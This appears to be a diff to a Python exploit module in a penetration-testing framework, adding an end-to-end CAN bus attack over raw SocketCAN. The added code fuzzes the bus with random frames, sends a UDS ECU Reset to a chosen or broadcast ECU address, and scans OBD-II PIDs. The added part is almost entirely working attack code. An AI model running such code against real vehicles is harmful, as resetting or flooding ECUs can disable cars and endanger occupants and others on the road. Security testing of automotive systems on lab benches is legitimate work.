@@ -202,3 +202,57 @@ class Exploit(Exploit):
         print_info("  caringcaribou (CC): https://github.com/CaringCaribou/caringcaribou")
         print_info("  UDSim: https://github.com/zombieCraig/UDSim")
         print_info("  Setup vcan: sudo modprobe vcan && sudo ip link add dev vcan0 type vcan && sudo ip link set vcan0 up")
+
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: CAN bus attack via SocketCAN raw frames."""
+        sock = self._open_can_socket()
+        if not sock:
+            print_warning("Sem socket CAN: skip E2E (requer root + driver CAN)")
+            return
+
+        mode = str(self.mode).lower()
+
+        if mode == "fuzz":
+            print_status("E2E: Fuzzing CAN bus via SocketCAN...")
+            for i in range(int(self.fuzz_count) if hasattr(self, "fuzz_count") else 100):
+                can_id = (i * 7 + 0x100) & 0x7FF
+                data = os.urandom(8)
+                frame = _build_can_frame(can_id, data)
+                try:
+                    sock.send(frame)
+                except OSError:
+                    break
+                time.sleep(0.001)
+            print_success(f"Fuzzing concluido: {i + 1} frames enviados")
+
+        elif mode == "uds_reset":
+            print_status("E2E: UDS ECU Reset via SocketCAN...")
+            ecu_id = int(self.ecu_id, 16) if hasattr(self, "ecu_id") and self.ecu_id else 0x7DF
+            reset_frame = _build_uds_request(0x11, 0x01)
+            can_frame = _build_can_frame(ecu_id, reset_frame)
+            try:
+                sock.send(can_frame)
+                print_success(f"UDS ECU Reset enviado para 0x{ecu_id:03X}")
+                sock.settimeout(2.0)
+                resp = sock.recv(16)
+                if resp:
+                    print_info(f"Resposta CAN: {resp.hex()}")
+            except OSError:
+                print_warning("Sem resposta do ECU")
+
+        elif mode == "enum" or mode == "obd2_scan":
+            print_status("E2E: OBD-II scan via SocketCAN...")
+            obd_pids = [0x00, 0x01, 0x0C, 0x0D, 0x05, 0x0F]
+            for pid in obd_pids:
+                req = _build_obd2_request(0x01, pid)
+                frame = _build_can_frame(0x7DF, req)
+                try:
+                    sock.send(frame)
+                    time.sleep(0.05)
+                except OSError:
+                    break
+            print_success(f"OBD-II scan concluido: {len(obd_pids)} PIDs consultados")
+
+        sock.close()
